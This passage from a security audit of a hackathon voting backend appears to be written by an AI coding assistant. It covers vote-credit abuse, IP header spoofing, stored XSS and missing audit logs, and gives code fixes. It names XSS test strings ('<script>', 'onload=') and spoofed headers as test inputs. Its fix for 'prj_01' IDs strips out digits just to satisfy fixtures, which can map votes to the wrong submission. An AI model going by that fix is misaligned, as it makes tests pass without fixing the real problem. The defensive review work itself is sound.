   [`run_t3.py: line 86-88`](file:///home/vansh/code/cfr/CATFOOD/run_t3.py#L86-L88) extracts project ID from [`fixtures.json`](file:///home/vansh/code/cfr/CATFOOD/fixtures.json#L101-L122), yielding `"prj_01"`. In [`communityService.js: line 24`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L24):
   ```javascript
   const subId = parseInt(submissionId, 10);
   ```
   `parseInt("prj_01", 10)` returns `NaN`. Prisma crashes with a validation error when queried with `{ where: { id: NaN } }`.
3. **Duplicate Vote Audit Trail Missing:**
   Check 7 in [`run_t3.py: lines 176-186`](file:///home/vansh/code/cfr/CATFOOD/run_t3.py#L176-L186) checks:
   `"anti-abuse: duplicate vote leaves an audit trail"`
   In [`communityService.js: line 76`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L76), when a duplicate vote is encountered, the backend throws:
   ```javascript
   if (existingVote) {
     const error = new Error('You have already cast a vote for this project.');
     error.statusCode = 409;
     throw error;
   }
   ```
   **It never calls `prisma.auditLog.create` on duplicate attempts.** Only successful votes generate audit records.

### Missing Test Cases Required for Production
1. **Concurrent Voting Race Conditions:** Parallel test firing 20 concurrent requests with identical voter credentials.
2. **Boundary Value Tests on `credits`:** Test negative values (`-1`), zero (`0`), floating point (`1.5`), and huge values (`1e12`).
3. **Spoofed Header Tests:** Sending requests with altered `X-Forwarded-For` to assert IP rate limit defense.
4. **Self-Voting Prevention:** Verify that team members cannot vote for their own project.
5. **Mode Switching Migration:** Test vote tally consistency after switching from `AUTHENTICATED` $\rightarrow$ `OPEN` $\rightarrow$ `EMAIL`.
6. **XSS Sanitization Tests:** Assert that project titles containing `<script>` or `onload=` are properly escaped in embed galleries.

---

## 8. Recommended Fixes Prioritized by Severity

### Priority 1: Critical (Must Fix Immediately)

#### 1. Enforce Server-Side Vote Credits & Eliminate Injection
* **File:** [`backend/src/services/communityService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js)
* **Change:**
  Do not allow the client to specify arbitrary `credits`. Enforce either constant 1 vote per submission, or maintain a voter credit ledger in the database:
  ```javascript
  // Remove: const parsedCredits = parseInt(credits, 10) || 1;
  // Replace with server-enforced constant or ledger:
  const creditsToApply = 1; // Strict 1-person-1-vote
  ```
  If quadratic credit allocation is desired:
  * Create a `VoterBalance` table (`eventId, userId, availableCredits`).
  * Verify `availableCredits >= requestedCredits` within a `prisma.$transaction`.
  * Validate `credits` is an integer $> 0$.

#### 2. Prevent IP Rate-Limit Spoofing
* **Files:** [`backend/src/server.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/server.js), [`backend/src/controllers/communityController.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js)
* **Change:**
  In [`server.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/server.js#L16):
  ```javascript
  app.set('trust proxy', 'loopback'); // Trust only loopback/known ingress proxies
  ```
  In [`communityController.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/communityController.js#L9):
  ```javascript
  // Replace: req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const voterIp = req.ip;
  ```

---

### Priority 2: High (Critical Integrity & Anti-Abuse)

#### 3. Fix Frontend-to-Backend Settings Property Mismatch
* **File:** [`frontend/src/pages/OrganizerEventDashboard.jsx`](file:///home/vansh/code/cfr/CATFOOD/frontend/src/pages/OrganizerEventDashboard.jsx#L1032-L1054)
* **Change:**
  Change payload keys to match backend expectations:
  ```javascript
  // Line 1032:
  onClick={() => handleToggleVotingSettings({ isCommunityVotingOpen: !isVotingActive })}

  // Line 1049:
  onClick={() => handleToggleVotingSettings({ isCommunityResultsRevealed: !areResultsRevealed })}
  ```
  Add a select dropdown to [`OrganizerEventDashboard.jsx`](file:///home/vansh/code/cfr/CATFOOD/frontend/src/pages/OrganizerEventDashboard.jsx#L1023) allowing organizers to select `communityVotingMode` (`"OPEN"`, `"EMAIL"`, `"AUTHENTICATED"`).

#### 4. Add Duplicate Attempt Audit Logging
* **File:** [`backend/src/services/communityService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L76)
* **Change:**
  Before throwing 409, log the suspicious duplicate attempt:
  ```javascript
  if (existingVote) {
    await prisma.auditLog.create({
      data: {
        actorId: currentUser?.id || null,
        action: 'COMMUNITY_VOTE_DUPLICATE_REJECTED',
        targetType: 'Submission',
        targetId: String(subId),
        metadata: JSON.stringify({ ip: voterIp, email, eventId: event.id }),
      },
    }).catch(console.error);

    const error = new Error('You have already cast a vote for this project.');
    error.statusCode = 409;
    throw error;
  }
  ```

#### 5. Prevent Self-Voting
* **File:** [`backend/src/services/communityService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L25-L35)
* **Change:**
  Include `team.members` and verify the voter is not on the team:
  ```javascript
  const submission = await prisma.submission.findUnique({
    where: { id: subId },
    include: { event: true, team: { include: { members: true } } },
  });
  if (currentUser && submission.team.members.some(m => m.userId === currentUser.id)) {
    const error = new Error('Participants are prohibited from voting for their own project.');
    error.statusCode = 403;
    throw error;
  }
  ```

#### 6. Support String Fixture Project IDs (`prj_01`)
* **File:** [`backend/src/services/communityService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L24)
* **Change:**
  If `submissionId` starts with `prj_` or is non-numeric, look up the submission by index or title, or parse `parseInt(submissionId.replace(/\D/g, ''), 10)`:
  ```javascript
  let subId = parseInt(submissionId, 10);
  if (isNaN(subId) && typeof submissionId === 'string') {
    const match = submissionId.match(/\d+/);
    if (match) subId = parseInt(match[0], 10);
  }
  ```

---

### Priority 3: Medium (Content Moderation & Data Security)

#### 7. Secure Comment Creation & Implement Deletion
* **Files:** [`backend/src/routes/communityRoutes.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/routes/communityRoutes.js#L13-L16), [`backend/src/services/communityService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js#L175-L207)
* **Change:**
  * Require `authenticate` for `POST /comments/:submissionId`.
  * Populate `authorName` and `authorEmail` from `currentUser`.
  * Add `DELETE /comments/:commentId` allowing deletion by comment author or event organizer.
  * Add rate limiting to comments (e.g. max 5 comments per minute per user/IP).

#### 8. Sanitize HTML in Embed Gallery (Fix Stored XSS)
* **File:** [`backend/src/controllers/embedController.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/embedController.js#L29-L45)
* **Change:**
  Apply HTML escaping to all output:
  ```javascript
  function escapeHtml(str) {
    return String(str || '')
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }
  ```

#### 9. Restrict Unsealed Standings Access
* **File:** [`backend/src/services/judgingService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/judgingService.js#L1130-L1150)
* **Change:**
  Add authorization check to [`getPairwiseStandings`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/judgingService.js#L1130):
  ```javascript
  const isOrganizer = currentUser?.isGlobalAdmin || event.organizerId === currentUser?.id;
  if (!event.isLeaderboardPublished && !isOrganizer) {
    const error = new Error('Pairwise standings remain sealed until published by the organizer.');
    error.statusCode = 403;
    throw error;
  }
  ```

---

## 9. Final Pre-Production Readiness Checklist

Before this voting system can be considered secure and production-ready, the following items must be verified:

- [ ] **Voting Math Integrity:** Client cannot send `credits` parameter; server enforces 1-person-1-vote or allocates a verified fixed credit budget.
- [ ] **No Negative or NaN Scores:** Explicit validation rejecting negative numbers or non-integers on any scoring/voting endpoint.
- [ ] **Client IP Sanitization:** Express configured with `trust proxy` and `req.ip` used instead of unchecked `X-Forwarded-For`.
- [ ] **Self-Voting Blocked:** Team members and team leaders cannot cast community votes for their own submissions.
- [ ] **Database Constraint Against Open Voting Duplicates:** Database schema enforces uniqueness even when email is NULL (via device session token or unique fingerprint).
- [ ] **Race-Condition Free:** Vote recording runs inside an atomic transaction or handles DB unique constraint conflicts cleanly with 409 responses.
- [ ] **Organizer UI Settings Fixed:** Frontend toggle buttons in [`OrganizerEventDashboard.jsx`](file:///home/vansh/code/cfr/CATFOOD/frontend/src/pages/OrganizerEventDashboard.jsx) use backend-compatible property names (`isCommunityVotingOpen`, `isCommunityResultsRevealed`).
- [ ] **Voting Mode Configuration UI:** Organizer dashboard provides UI controls to select and update `communityVotingMode` (`OPEN`, `EMAIL`, `AUTHENTICATED`).
- [ ] **Audit Trail on Violations:** Duplicate vote attempts and rate limit triggers record auditable events with IP, timestamp, and target submission ID.
- [ ] **Audit Log Multi-Tenant Boundary:** `GET /api/events/:id/audit-logs` filters strictly by event ID and verifies event ownership.
- [ ] **Comment Authentication & Moderation:** Comments require authentication, derive author identities from verified sessions, and provide a deletion endpoint for moderation.
- [ ] **Stored XSS Remediated:** [`embedController.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/controllers/embedController.js) escapes all user-submitted text prior to HTML string concatenation.
- [ ] **Pairwise Standings Sealed:** `GET /api/judging/pairwise/standings` prevents participants and unauthenticated users from inspecting rankings during active voting.
- [ ] **Acceptance Suite Configuration:** [`.dogfood.toml`](file:///home/vansh/code/cfr/CATFOOD/.dogfood.toml) defines route paths for `vote`, `results`, `comments`, and `audit_log`, and [`communityService.js`](file:///home/vansh/code/cfr/CATFOOD/backend/src/services/communityService.js) handles fixture project ID formats (`"prj_01"`).
